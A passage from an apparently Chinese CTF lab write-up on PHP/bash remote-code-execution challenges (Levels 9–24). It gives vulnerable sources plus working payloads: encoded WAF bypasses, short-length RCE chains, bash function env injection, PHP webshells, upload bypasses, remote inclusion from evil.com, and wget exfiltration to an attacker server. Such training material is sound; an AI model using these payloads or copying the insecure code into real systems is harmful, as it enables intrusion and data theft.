# 基本形式：A=$'\ooo' 将八进制解析为字符
# 如 ls → $'\154\163'
?cmd=$'\154\163'

# 带参数命令需要分开写
# cat /flag → 每个字符分别转为八进制
?cmd=$'\143\141\164' $'\57\146\154\141\147'
# 字母 c=143, a=141, t=164; / =057, f=146, l=154, a=141, g=147

# 如果空格也被禁，可以用 < 重定向
?cmd=$'\143\141\164'<$'\57\146\154\141\147'
```

**为什么不能写成一行：**
```bash
$'\143\141\164\40\57\146\154\141\147'
# bash 解析为字符串 "cat /flag"，然后试图将其作为程序名查找，报 command not found
# 必须将命令和参数分开，让 bash 分别解析为命令名和参数
```

**ASCII 八进制对照：**
- 小写字母 a-z = `\141` ~ `\172`
- 大写字母 A-Z = `\101` ~ `\132`
- 数字 0-9 = `\060` ~ `\071`
- 空格 = `\040`
- `/` = `\057`

---

## <a id="level-10"></a>Level 10 — 无字母命令执行：二进制整数替换

### 源码

```php
// index.php
<?php

function hello_shell($cmd){
    if(preg_match("/[A-Za-z2-9\"%*+,-.\/:;=>?@[\]^`|]/", $cmd)){
        die("WAF!");                     // 比 L9 多禁了数字 2-9
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;
highlight_file(__FILE__);
?>
```

### 漏洞分析

比 Level 9 多过滤了数字 2-9，可用字符更少：`0` `1` `$` `'` `\` `<` `(` `)` `#` `空格` `{` `}` `!` `~` `_`

核心原理：`$((2#binary))` — bash 支持用 `数字#值` 的格式表示任意进制数。`2#` 表示二进制。数字 2 可以用 `1<<1` 替换。

### 解题方法

**构造步骤：**

1. 取字符的 ASCII 值的八进制表示
2. 将八进制值视为十进制数，转为二进制
3. 用 `$((2#binary))` 包裹二进制数
4. 在最外层套上 `$\'\\xxx\\xxx\'` 的八进制转义
5. 用 Here String `$0<<<...` 再解析一次使八进制生效

**以 `ls` 命令为例：**

```bash
# l → ASCII 108 → 八进制 154 → 十进制 154 → 二进制 10011010
# s → ASCII 115 → 八进制 163 → 十进制 163 → 二进制 10100011

# 完整 payload
?cmd=$0<<<$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'
```

**带参数命令（如 cat /flag）：**

需要**两次** Here String 嵌套：
```bash
?cmd=$0<<<$0\<\<\<\$\'\\$(($((1<<1))#binary_c))...\\$(($((1<<1))#binary_g))\'
```

**为什么需要 Here String 两次：**

- 第一次 `<<<`：传递整个转义字符串
- bash 解析八进制转义，得到 `cat /flag` 字符串
- 第二次 `<<<`：将得到的字符串作为命令再次执行

**更多细节请参考：** [BashFuck 在线生成器](https://probiusofficial.github.io/bashFuck/)

---

## <a id="level-11"></a>Level 11 — 数字 1 的特殊变量替换

### 源码

```php
// index.php
<?php

function hello_shell($cmd){
    if(preg_match("/[A-Za-z1-9\"%*+,-.\/:;=>?@[\]^`|]/", $cmd)){
        die("WAF!");                     // 比 L10 多禁了数字 1
    }
    system($cmd);
}

isset($_POST['cmd']) ? hello_shell($_POST['cmd']) : null;
// 注意：改为 POST 传参，因为 payload 长度可能超出 GET 限制
highlight_file(__FILE__);
?>
```

### 漏洞分析

在 Level 10 基础上进一步过滤了 `1`。需要用其他方式表示数字 1。

### 关键变量：`${##}` = 1

原理：
- `${#}` → 传递给脚本的参数个数。`system()` 启动的 shell 没有参数，所以 `#` = 0
- `${##}` → 这是一个复合扩展。先解析 `${#}` = `"0"`，然后 `${#` 对外层的 `}` 内的变量名 `#` 求**字符串长度**。`"0"` 的长度 = 1
- 所以 `${##}` = 1 ✓

### 解题方法

将 Level 10 payload 中的所有 `1` 替换为 `${##}`：

```
原来的 1:  $((1<<1))#10100011
替换后:    $(($(1<<1))#${##}0100011)
```

完整形式（`ls` 命令）：
```bash
?cmd=$0<<<$0\<\<\<\$\'\\$(($((${##}<<${##}))#${##}00${##}${##}0${##}0))\\$(($((${##}<<${##}))#${##}0${##}000${##}${##}))\'
```

---

## <a id="level-12"></a>Level 12 — 数字 0 的特殊变量替换

### 源码

```python
# src/app.py — 使用 Flask + subprocess 而非 PHP
from flask import Flask, request, render_template_string, send_from_directory
import re
import subprocess

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def terminal():
    output = '''...'''
    if request.method == 'POST':
        command = request.form['command']
        if re.search(r'[A-Za-z0-9\"%*+,-.\/:;=>?@[\]^`|&_~]', command):
           output = "Command blocked by WAF!"
        else:
            try:
                output = subprocess.check_output(
                    ['bash', '-c', command],
                    stderr=subprocess.STDOUT, text=True
                )
            except subprocess.CalledProcessError as e:
                output = e.output
        return render_template_string(TEMPLATE, command=command, output=output)
    return render_template_string(TEMPLATE, command="", output=output)
```

### 漏洞分析

**为什么不用 PHP？** 因为 PHP 的 `system()` 函数无法提供完全一致的 Bash 环境，`${!#}` 等间接扩展特性在 PHP 的 `system()` 中无法正常使用。LEvel 12 改用 Flask 的 `subprocess.check_output(['bash', '-c', command])` 直接调用 bash。

**WAF 规则：** 过滤了 `A-Za-z0-9`，即所有字母和数字全部被封。可用字符包括：`!` `$` `#` `'` `(` `)` `<` `\` `{` `}` 空格

### 关键变量：`${!#}` = bash (输出为空再经 Here String 解析)

在 Level 11 我们有了 `${##}` = 1。现在需要替换 0。

- 原本 `${#}` = 0
- `${!#}` 是间接扩展：先用 `${#}` 得到 0，然后 `${!0}` 在 bash 中等同于 `$0`，即当前 shell 的名称
- 但在 sh 中 `0` 实际上是脚本名设为 `sh`，取长度得不到期望结果
- 这就是为什么要用 Flask + subprocess 直接调 bash

**完全替换后的 payload（`ls` 命令）：**
```bash
${!#}<<<${!#}\<\<\<\$\'\\$(($((${##}<<${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}${##}${##}))\'
```

**字符替换对照：**
- `0` → `${#}`
- `1` → `${##}`

---

## <a id="level-13"></a>Level 13 — 特殊扩展替换任意数字

### 源码

```php
// index.php
<?php

function hello_shell($cmd){
    if(preg_match("/[A-Za-z0-9\"%*+,-.\/:;>?@[\]^`|]/", $cmd)){
        die("WAF!");                     // 禁了所有字母和数字，还禁了更多符号
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;
highlight_file(__FILE__);
?>
```

### 漏洞分析

在 Level 10-12 中，我们依赖 `$((2#binary))` 中的 `#`。如果 `#` 被禁用怎么办？

本题的替代方案：用**多个 `-1` 的叠加再取反**来构造任意数字 0-7。

### 核心原理

```bash
echo $(())                        # 空运算 = 0
echo $((~$(())))                  # ~0 = -1
echo $(($((~$(())))$((~$(())))))  # -1 + -1 = -2
echo $((~$(($((~$(())))$((~$(())))))))  # ~(-2) = 1
```

**构造数字 0-7 的公式：**

```bash
0 = $(())                          # 空运算
1 = $((~$(($((~$(())))$((~$(())))))))  # ~(-2) = 1
2 = $((~$(($((~$(())))$((~$(())))$((~$(())))))))  # ~(-3) = 2
3 = $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))  # ~(-4) = 3
# ... 以此类推，每多一个 $((~$(()))) 就多一个 -1，取反后得到递增的正数
```

### 解题方法

```bash
# 1. 先设置 __=$(())，让 __ 的值为 0
# 2. 通过 ${!__} 拿到 "sh" 字符串
# 3. 用 && 连接两条命令

__=$(())&&${!__}<<<${!__}\<\<\<\$\'\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\'
# 对应：sh<<<sh<<<$'\154\163'
```

**为什么需要 && 连接两条命令：**
1. `__=$(())` — 在 shell 中设置变量 `__` 的值为 0
2. `${!__}` — 间接展开 `__` 得到 0，然后 `${!0}` 就是 `$0` = `sh`

因为不能使用字母命名变量（`__` 两个下划线符合 bash 变量命名规则：下划线或字母开头，可包含下划线、字母、数字），且 `&&` 未被过滤。

---

## <a id="level-14"></a>Level 14 — 长度限制：7字符 RCE

### 源码

```php
// index.php
<?php
highlight_file(__FILE__);

if(isset($_GET[1]) && strlen($_GET[1]) < 8){
    echo strlen($_GET[1]);
    echo '<hr/>';
    echo shell_exec($_GET[1]);
}else{
    exit('too long');
}
?>
```

### 漏洞分析

每次输入最多 7 个字符，通过 `shell_exec()` 执行。需要在极其有限的长度下实现任意命令执行。

### 核心技巧

```bash
>a          # 创建空文件 a（5个字符内）
ls -t       # 按修改时间排序（最新的在前）
sh a        # 把文件 a 中的每一行作为命令执行
# 使用 \ 实现命令换行拼接
```

### 解题方法（完整攻击链）

假设我们要执行 `cat /flag`：

**Step 1：分段写入命令片段**

```bash
# 每次请求写入一个文件名，利用 \ 实现换行续接
?1=>l\       # 创建文件 "l\"（\ 是换行转义）
?1=>s\       # 创建文件 "s\"
?1=>\ \       # 创建文件 " \"（空格后面接更多内容时用）
?1=>-t\      # 创建文件 "-t\"
?1=>\>a      # 创建文件 ">a"（这是 ls -t > a 的最后一部分）
?1=>sh\      # 创建文件 "sh\"
?1=>ba\      # 创建文件 "ba\" （base64 编码思路）
?1=>se\      # 创建文件 "se\"
?1=>64\      # 创建文件 "64\"
?1=>\ /?a?   # 创建文件 " /?a?"（/flag 的通配符形式）
```

**Step 2：聚合**

```bash
?1=ls -t>a   # 将 ls -t 的输出（即文件名列表，按时间倒序）写入文件 a
```

**Step 3：执行**

```bash
?1=sh a      # 执行 a 文件中的命令
```

当 `ls -t > a` 执行时，所有创建的文件名按照修改时间从晚到早排列，形成类似这样的内容：
```
sh
l\
s\
 -t\
>a
base64\   # 或 cat\
 /?a?
```
然后 `sh a` 执行时，`\` 会将行连接起来，最终执行的是 `ls -t > a` 和完整的读取命令。

**更高效的做法 — 使用 base64：**

```bash
# 先通过短命令写入一个包含 base64 编码命令的文件
>f\
>lag\
>\n*
>w\
>\nf\
>la\
>g?\
>?a?\
>??\
>/?\
>\n\
>\x20\
>?4\
>6?\
>??\
>?6\
>se\
>ba\
>\|\
ls -t>a
sh a
# 最终 a 文件内容类似: base64 /flag > /var/www/html/result.txt
```

---

## <a id="level-15"></a>Level 15 — 长度限制：5字符 RCE

### 源码

```php
// index.php
<?php

$sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);                       # 为每个 IP 创建独立沙箱
@chdir($sandbox);                       # 切换工作目录到沙箱
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
    @exec($_GET['cmd']);                # exec() 无回显
} else if (isset($_GET['reset'])) {
    @exec('/bin/rm -rf ' . $sandbox);   # 重置沙箱
}
highlight_file(__FILE__);
?>
```

### 漏洞分析

相比 Level 14：
- 字符限制更严格：≤ 5 个字符
- 使用 `exec()` 无回显，需要外带或将结果写入文件
- 每个 IP 有独立沙箱目录，避免干扰

### 解题方法

核心思路与 7 字符 RCE 相同，但命令更紧凑：

**Step 1：利用 `rev` 命令反转文件名**

```bash
# 基本命令最大 5 字符
?cmd=>dir    # 创建文件 "dir"
?cmd=*>v     # * 通配符匹配所有文件（即 "dir"），>v 输出重定向
             # 如果 dir 内容为字符串，* 会执行它，输出写入 v
?cmd=rev v   # 反转文件 v 的内容
```

**Step 2：利用 `ls -t` + `sh` 执行链**

```bash
?cmd=>l\     # 创建文件
?cmd=>s\     # 创建文件
?cmd=>\ \
?cmd=>-t\
?cmd=>\>a
?cmd=ls -t>a  # 聚集
?cmd=sh a     # 执行
```

**Step 3：写入 Web 可访问路径**

由于 `exec()` 无回显，最终需要将 flag 复制到 web 目录：
```bash
cat /flag > /var/www/html/flag.txt
# 然后直接访问 http://target/flag.txt
```

具体做法是把命令分段、用 `\` 拼接、`ls -t` 聚合，与 Level 14 相同但每个命令长度 ≤ 5。

**扩展 — 使用 `wget` 外带：**
```bash
wget your-server/$(cat /flag)
```

---

## <a id="level-16"></a>Level 16 — 长度限制：4字符 RCE

### 源码

```php
// index.php
<?php

$sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {     # 限制 ≤ 4 字符！
    @exec($_GET['cmd']);
} else if (isset($_GET['reset'])) {
    @exec('/bin/rm -rf ' . $sandbox);
}
highlight_file(__FILE__);
?>
```

### 漏洞分析

只有 4 个字符！这是从 [HITCON 2017 BabyFirst-Revenge-v2](https://github.com/orangetw/My-CTF-Web-Challenges) 衍生而来的极限挑战。

在这种限制下，每个命令最多 4 字符，基本只能做：
- `>xxx` — 创建文件
- `ls` — 列出目录
- `*` — 通配符匹配

### 解题方法

**核心思路：** 利用文件内容本身作为命令来源，配合通配符 `*` 自执行。

**Step 1：利用 `dir` 写入**

```bash
# dir 命令在 ls 不可用（超出4字符）时的替代
?cmd=>dir    # 创建文件 "dir"（内容 "dir\n"）
?cmd=*>v     # 通配符 * 匹配到 "dir"，>v 重定向到文件 v
             # 执行时实际运行: dir > v，相当于 ls > v
```

**Step 2：逐字节构造命令**

由于只能创建文件，利用 `rev` 命令：
```bash
# rev 是 3 字符，符合要求！
>rev        # 创建文件
*>v         # 执行 rev > v
```

**Step 3：完整攻击链**

```bash
>w\           # 建立 base64 编码的命令分段
>f\           
>lag\         
> *\          
>\|\          
>?4           
>6?           
>??           
>?6           
>se           
>ba           
> *\          
>\|\          
>te           
>?a?           
> -\          
> x           
> x           
>?d?          
>??           
>/?           
ls -t>a       # 注意！"ls -t>a" 是 7 个字符，在这里不可用
# 需要用更短的方式或分段执行
```

这是一个非常精致的技巧，需要：
1. 通过 `>xxx` 创建以命令片段命名的文件
2. 利用 `ls >> a` 等方式聚合文件名
3. 利用 `*` 通配符执行文件内容

详细操作请参考 [HITCON 2017 writeup](https://github.com/orangetw/My-CTF-Web-Challenges)。

---

## <a id="level-17"></a>Level 17 — PHP 命令执行函数

### 源码

```php
// index.php
<?php
session_start();

function hello_ctf($function, $content){
    if($function == '``'){
        $code = '`'.$content.'`';
        echo "Your Code: $code <br>";
        eval("echo $code");
    } else {
        $code = $function . "(" . $content . ");";
        echo "Your Code: $code <br>";
        eval($code);
    }
}

function get_fun(){
    $func_list = ['system', 'exec', 'shell_exec', 'passthru', 'popen', '``'];
    if (!isset($_SESSION['random_func'])) {
        $_SESSION['random_func'] = $func_list[array_rand($func_list)];
    }
    $random_func = $_SESSION['random_func'];
    echo "获得新的函数: $random_func<br>";
    return $_SESSION['random_func'];
}

function start($act){
    $random_func = get_fun();
    if($act == "r"){
        session_unset();
        session_destroy();
    }
    if ($act == "submit"){
        $user_content = $_POST['content'];
        hello_ctf($random_func, $user_content);
    }
}

isset($_GET['action']) ? start($_GET['action']) : '';
highlight_file(__FILE__);
?>
```

### 解题方法

与 Level 2 类似，随机抽取函数，但这里是**命令执行函数**而非代码执行函数。根据抽到的函数提交对应 payload：

**各函数 payload 对照表：**

| 函数 | POST `content` | 说明 |
|------|---------------|------|
| `system` | `'cat /flag'` | 直接执行并输出 |
| `exec` | `'cat /flag',$o` | 结果存入数组 $o，一般不直接输出 |
| `shell_exec` | `'cat /flag'` | 返回字符串，通过 `eval("echo shell_exec(...)")` 输出 |
| `passthru` | `'cat /flag'` | 直接输出，支持二进制 |
| `popen` | `'cat /flag','r'` | 返回资源，需 fread 读取 |
| 反引号 `` ` `` | `cat /flag` | 特殊处理，直接包裹反引号 |

**如果抽到不理想的函数（如 `exec` 不输出）：** 发送 `?action=r` 重置 session 换函数。

### PHP 命令执行函数详解

| 函数 | 输出方式 | 返回值 |
|------|----------|--------|
| `system()` | 直接输出到响应 | 最后一行输出或 false |
| `exec()` | 不输出，存入数组参数 | 最后一行或 false |
| `shell_exec()` | 不输出，返回字符串 | 完整输出字符串或 null |
| `passthru()` | 直接输出，适合二进制 | null 或 false |
| `popen()` | 不输出，返回文件指针 | 资源句柄 |
| 反引号 | 不输出，返回字符串 | 同 shell_exec() |

---

## <a id="level-18"></a>Level 18 — 环境变量注入

### 源码

```php
// index.php
<?php

foreach($_REQUEST['envs'] as $key => $val) {
    putenv("{$key}={$val}");             # 将用户可控的键值对写入环境变量
}

system('echo hello');                    # 看起来无害的 system 调用

highlight_file(__FILE__);
?>
```

### 漏洞分析

引自 P 牛 (P神) 的著名文章：[我是如何利用环境变量注入执行任意命令](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html)。

核心：虽然 `system('echo hello')` 看起来无害，但如果我们能**通过环境变量注入 Bash 函数定义**，就能劫持 `echo` 命令的执行。

### Bash 环境变量注入漏洞原理

Bash 支持通过环境变量传递函数定义：
- 环境变量名格式：`BASH_FUNC_函数名%%` (Bash >= 4.4) 或 `BASH_FUNC_函数名()` (Bash < 4.4)
- 环境变量值：`() { 命令体; }`

当新 bash 进程启动时，会自动导入这些环境变量作为 shell 函数，从而劫持同名命令。

### 解题方法

**Bash ≥ 4.4（本靶场环境）：**

```bash
# URL 原始形式
?envs[BASH_FUNC_echo%%]=() { cat /flag; }

# URL 编码形式（%25%25 是 %% 的编码）
?envs[BASH_FUNC_echo%25%25]=()%20{%20cat%20/flag;%20}
```

**Bash < 4.4：**

```bash
?envs['BASH_FUNC_echo()']=() { cat /flag; }
```

### 漏洞执行流程

1. `putenv()` 设置了环境变量 `BASH_FUNC_echo%%=() { cat /flag; }`
2. `system('echo hello')` 启动一个新的 `/bin/sh -c "echo hello"`
3. 新的 shell 进程读取环境变量，将 `echo` 解析为一个 shell 函数
4. 执行 `echo hello` 时，实际调用的是我们注入的函数 `() { cat /flag; }`
5. 结果：flag 被输出，而原本的 `echo` 没有执行

### 防御与适用条件

- **Bash 版本相关：** Bash 4.4 之后改变了函数导出的环境变量格式（添加了 `%%` 后缀）
- **Shell 类型：** 必须是 bash 启动（dash 不支持此特性）
- **PHP 安全模式：** `putenv()` 可能在安全模式下被禁用
- **修复：** 升级 bash、不使用 `putenv()` 处理用户输入、使用 `proc_open()` 替代 `system()`

---

## <a id="level-19"></a>Level 19 — 文件写入导致的 RCE

### 靶场环境

- 基于 `php:7.3-apache`
- Apache + mod_php 方式运行
- Flag 由 `entrypoint.sh` 在容器启动时写入 `/flag`

### 漏洞描述

当 Web 应用有**文件写入**能力且写入路径和内容可控时，攻击者可以将恶意 PHP 代码写入 Web 可访问目录，进而 getshell。

### 文件写入函数

| 函数 | 用法示例 | 说明 |
|------|----------|------|
| `file_put_contents()` | `file_put_contents('shell.php', '<?php eval($_GET[x]); ?>');` | 最简洁，直接写入字符串 |
| `fwrite()` / `fputs()` | `$fp = fopen('shell.php', 'w'); fwrite($fp, 'payload'); fclose($fp);` | 需要先打开文件流 |
| `fprintf()` | `$fp = fopen('shell.php', 'w'); fprintf($fp, '<?php eval($_GET[%s]); ?>', 'x');` | 支持格式化写入 |

### 解题方法

**1. 写入一句话木马**
```
利用可控的文件写入点，写入:
<?php @eval($_POST[x]); ?>
```

**2. 访问木马文件**
```
http://target/shell.php
POST: x=system('cat /flag');
```

**3. 直接写 flag 读取代码**
```
写入内容: <?php echo file_get_contents('/flag'); ?>
访问该文件即可看到 flag
```

### 实战场景扩展

除了直接写入 PHP 文件，还有以下变种：

- **写 `.htaccess` 文件：** 将 `.php` 后缀映射到其他可写后缀，或引入新的解析规则
- **写 `.user.ini` 文件：** PHP 自动包含模式，`auto_prepend_file` 指定在每个 PHP 页面执行前自动包含的文件
- **写 SSH authorized_keys：** 写 shell 到其他服务
- **写定时任务 (crontab)：** `/etc/cron.d/` 下写入定时任务反弹 shell

---

## <a id="level-20"></a>Level 20 — 文件上传导致的 RCE

### 源码

```php
// 表单部分（HTML）
<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="fileToUpload" id="fileToUpload">
    <input type="submit" value="上传文件" name="submit">
</form>

// 处理逻辑（PHP）
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target_dir = "uploads/";
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "文件 " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " 已成功上传.";
    } elseif (!isset($_FILES["fileToUpload"])) {
        echo "请先选择要上传的文件.";
    } else {
        echo "抱歉，文件上传失败.";
    }
}
?>
```

### 漏洞分析

**本关没有任何 WAF！** 直接上传任何文件类型，保存到 `uploads/` 目录，文件名使用原始文件名。这是最基础的文件上传漏洞。

### 解题方法

**Step 1：** 创建一个 PHP Webshell 文件：

```php
<?php system($_GET['cmd']); ?>
```

**Step 2：** 通过表上传该文件

**Step 3：** 访问 `http://target/uploads/shell.php?cmd=cat /flag`

### 常见文件上传绕过技巧（本关未涉及但在实战中常见）

| 绕过类型 | 方法 |
|----------|------|
| **前端 JS 校验** | 抓包修改、禁用 JS、直接发 HTTP 请求 |
| **MIME 类型校验** | 修改 Content-Type 为 `image/png` 等白名单类型 |
| **后缀名黑名单** | 使用 `.php5`, `.phtml`, `.pht`, `.phar`, `.shtml` 等 |
| **图片马 + 文件包含** | 在图片中插入 PHP 代码，配合 LFI 执行 |
| **`.htaccess` 解析漏洞** | 上传 `.htaccess` 指定某后缀按 PHP 解析 |
| **双写后缀** | `.pphphp` → 过滤掉 `php` → `.php` |
| **大小写** | `.PHP`, `.Php` |
| **Windows 特性** | `shell.php.`、`shell.php::$DATA` |
| **竞争上传** | 在上传至检查间隙访问文件 |

---

## <a id="level-21"></a>Level 21 — 文件包含导致的 RCE

### 源码

```php
// index.php
<?php
/*
include() 将会把用户传递的内容以字符串方式拼接到 include() 中
注意区别 include($_GET['file']) 和 include("xxx".$_GET['file'])
*/

function helloctf($code){
    $code = "include(".$code.");";          // 用户输入直接拼接进 include()
    echo "Your includeCode : ".$code;
    eval($code);                             // eval + include 的组合
}

isset($_POST['c']) ? helloctf($_POST['c']) : '';
highlight_file(__FILE__);
?>
```

### 漏洞分析

用户输入 `$code` 被拼接为 `include(用户输入);` 然后用 `eval()` 执行。注意不是 `include($_GET['file']);` 而是 `include(用户输入);`，这意味着我们需要在字符串上下文中构造有效的 PHP 参数。

### 解题方法

**方法一：直接利用 `php://input`（需要 POST body）**

```bash
POST: c='php://input'
# Body: <?php system('cat /flag'); ?>
```

**方法二：Filter Chain（PHP 过滤器链）**

当 `include($code)` 中的 `$code` 是一个字符串（被引号包裹），但题目使用 `eval("include(".$code.");")`，因此 `$code` 本身可以是任意 PHP 表达式。

利用 PHP Filter Chain 生成器构造 payload，将任意 PHP 代码编码为 filter 链：
- 在线工具：https://probiusofficial.github.io/PHP-FilterChain-Exploit/
- 靶场内置：`/exp.php`

**Filter Chain 原理：**

PHP 的 `php://filter` 支持链式调用多个过滤器。通过精心排列的字符集转换过滤器（`convert.iconv.*`），可以在**不包含任何 PHP 代码字符**的情况下，逐步"构建"出任意 PHP 代码。

一个 Filter Chain 的基本结构：
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|...|convert.base64-decode/resource=php://temp
```

**方法三：远程文件包含（如果 allow_url_include=On）**

```bash
POST: c='http://evil.com/shell.txt'
```

远程服务器上的 `shell.txt` 包含 PHP 代码，被 `include()` 解析执行。

**方法四：利用 base64 和 data:// 伪协议**

```bash
POST: c='data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg=='
# base64 解码: <?php system('cat /flag'); ?>
```

### 文件包含漏洞类型总结

| 类型 | 说明 | 利用方法 |
|------|------|----------|
| **LFI** | 本地文件包含 | 日志包含、session 包含、临时文件包含、伪协议 |
| **RFI** | 远程文件包含 | 远程服务器托管恶意 PHP 代码 |
| **Filter Chain** | 利用 PHP 过滤器链 | 无字符 RCE |
| **phar://** | Phar 反序列化 | 配合文件上传触发反序列化 |
| **pearcmd.php** | Pear 命令行扩展 | PHP 默认安装时的 RCE 向量 |

---

## <a id="level-22"></a>Level 22 — PHP 动态调用

### 源码

```php
// index.php
<?php
/*
PHP 支持在运行时动态构建并调用函数。
在下面的代码中 a 可以作为函数名，b 可以作为函数的参数。
*/

isset($_GET['a']) && isset($_GET['b']) ? $_GET['a']($_GET['b']) : null;

highlight_file(__FILE__);
?>
```

### 漏洞分析

**核心是在一行代码：** `$_GET['a']($_GET['b']);`

PHP 允许将字符串作为函数名进行调用。这被称为"可变函数"（Variable Functions）。如果 `a=system`，则 `$_GET['a']` 返回字符串 `"system"`，然后将其作为函数调用，参数为 `$_GET['b']`。

### 解题方法

```bash
# 命令执行
?a=system&b=cat /flag

# 代码执行
?a=assert&b=print_r(file_get_contents('/flag'))

# 执行任意 PHP 代码
?a=eval&b=echo file_get_contents('/flag');
```

**更多可变函数 chain：**
```bash
# call_user_func 嵌套
?a=call_user_func&b[]=system&b[]=cat /flag
# 注意：第二个 b 是数组形式传递多个参数
```

### PHP 可变函数/动态调用详解

PHP 支持以下动态调用方式：

```php
$func = "system";
$func("cat /flag");          // 动态函数调用

$obj->$method();              // 动态方法调用

$class::$static_method();    // 动态静态方法调用

call_user_func("system", "cat /flag");     // 回调函数
call_user_func_array("system", ["cat /flag"]); // 带数组参数
```

---

## <a id="level-23"></a>Level 23 — PHP 自增构造

### 源码

```php
// index.php
<?php
error_reporting(0);

highlight_file(__FILE__);

isset($_POST['code']) ? $code = $_POST['code'] : $code = null;

if(preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/", $code)){
    die("WAF!");         # 禁止所有字母和数字，以及大部分特殊符号
} else {
    echo "Your Payload's Length : ".strlen($code)."<br>";
    eval($code);
}
?>
```

### 可用字符

通过 `reg_helper.php` 可以查看到可用字符集：`! $ ' ( ) + , . / ; = [ ] _` 和空格。

### 核心原理

这个关卡的 WAF 禁止了几乎所有常见字符，但保留了 `$`, `_`, `.`, `+`, `[`, `]`, `(`, `)` 等。

**三个关键 PHP 特性组合：**

**特性一：数组转字符串**
```php
$_ = [];        // 空数组
$_.''           // 拼接空字符串 → "Array"
([].'')         // "Array"
```

**特性二：字符串下标访问**
```php
$_ = "Hello-CTF";
echo $_[0];     // 输出 "H"
```
类似 C 语言的字符数组，PHP 字符串也可以用 `[索引]` 访问单个字符。

所以 `([].'')[0]` → `"Array"[0]` → `"A"`

**特性三：字符自增**
```php
$c = "A";
$c++;           // "B"
$c++;           // "C"
// ...
$c = "Z";
$c++;           // "AA"
$c++;           // "AB"
```
PHP 的 `++` 运算符作用于字符时，会产生 Perl 风格的字符递增——按照 ASCII 字母表顺序递增下一个字母。

### 解题方法

利用以上三个特性，从 `"A"` 出发，通过不断 `++` 自增构造出所有需要的字母，拼成函数名（如 `ASSERT`）和变量名（如 `_POST`）。

**构造 `ASSERT` + `_POST`：**

```php
// 1. 获取字符 "A"
$_=[].'';              // $_ = "Array"
$___ = $_[$__];        // $__ 未定义 = 0，所以 $___ = $_[0] = "A"
$__ = $___;            // $__ = "A"
$_ = $___;             // $_ = "A"

// 2. 自增构造 "S"（A→S = 18步）
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___ .= $__;           // $___ = "AS"

// 3. 再加 "S" 得 "ASS"
$___ .= $__;           // $___ = "ASS"

// 4. 自增构造 "E"（A→E = 4步），得 "ASSE"
$__ = $_;              // $__ = "A"
$__++;$__++;$__++;$__++;
$___ .= $__;           // $___ = "ASSE"

// 5. 自增构造 "R"（E→R = 12步），得 "ASSER"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___ .= $__;           // $___ = "ASSER"

// 6. 自增构造 "T"（R→T = 2步），得 "ASSERT"
$__++;$__++;
$___ .= $__;           // $___ = "ASSERT"

// 7. 同理构造 "_POST"
$__ = $_;              // $__ = "A"
$____ = "_";           // 直接可用 "_"
// A→P = 15步
$__++;... $____ .= $__; // "_P"
// P→O = -1? 需要重新来
// ...
// 最终得到 "_POST"

// 8. 获取 $_POST 并执行
$_ = $$____;            // $$____ = ${"_POST"} = $_POST
$___($_[_]);            // ASSERT($_POST[_])
```

然后 POST 提交：
```
POST: _=system&__=cat /flag
```

**紧凑版 payload：**
```php
$_=(([]).'')[''+''];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_=$_.$__;$__=$_[$/=''];$__++;$__++;$__++;$__++;$_=$_.$__;$__=$_[$/];$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_=$_.$__;$__=$_[$/];$__++;$__++;$_=$_.$__;$____='_';$__=$_[$/];$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_[$/];$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__++;$__++;$__++;$__++;$____.=$__;$__++;$____.=$__;$_=$$____;$_($__($_));
```

---

## <a id="level-24"></a>Level 24 — 无参命令执行

### 源码

```php
// index.php
<?php
include ("get_flag.php");

function hello_code($code){
    if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $code)){
        eval($code);     // 只允许 A(B(C())) 形式的嵌套函数调用
    } else {
        die("O.o");
    }
}

isset($_GET['code']) ? hello_code($_GET['code']) : null;
highlight_file(__FILE__);
?>
```

### 正则分析

`/[^\W]+\((?R)?\)/` 的含义：
- `[^\W]+` — 一个或多个"非非单词字符"（即 `\w`，单词字符 = `[a-zA-Z0-9_]`）
